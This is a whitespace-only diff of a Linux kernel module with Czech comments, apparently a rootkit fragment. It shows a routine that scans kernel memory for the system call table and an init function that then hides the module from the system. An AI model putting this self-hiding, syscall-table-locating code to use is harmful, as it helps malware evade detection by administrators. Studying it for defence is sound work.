@@ -174,23 +174,23 @@ static void schovej_tento_modul(void)
  */
 static unsigned long **najdi_tabulku_systemovych_volani(void)
 {
-	unsigned long int i = PAMET_START;
-	unsigned long **sc_tabulka;
+   unsigned long int i = PAMET_START;
+   unsigned long **sc_tabulka;
 
    // prohledavam pamet od PAMET_START do PAMET_KONEC
-	while ( i < PAMET_KONEC ) 
+   while ( i < PAMET_KONEC ) 
    {
       sc_tabulka = (unsigned long **) i;
 
       // porovnavam s exportovanym volanim sys_close
-		if ( sc_tabulka[__NR_close] == (unsigned long *) sys_close )
+      if ( sc_tabulka[__NR_close] == (unsigned long *) sys_close )
       {
          return &(*sc_tabulka);
-		}
+      }
 		
       // postupne posouvam ukazatel na sc_tabulka
-		i += sizeof(void *);
-	}
+      i += sizeof(void *);
+   }
 
 	return NULL;
 }
@@ -219,11 +219,11 @@ static int init(void)
    // zjistim si adresu do sys_call_table
    sys_call_table = (unsigned long *) najdi_tabulku_systemovych_volani();
 
-	if ( sys_call_table == NULL ) 
+   if ( sys_call_table == NULL ) 
    {
       printk("Error: sct nenalezena!\n");
       return 0;
-	}
+   }
    
    // schovam modul
    schovej_tento_modul();
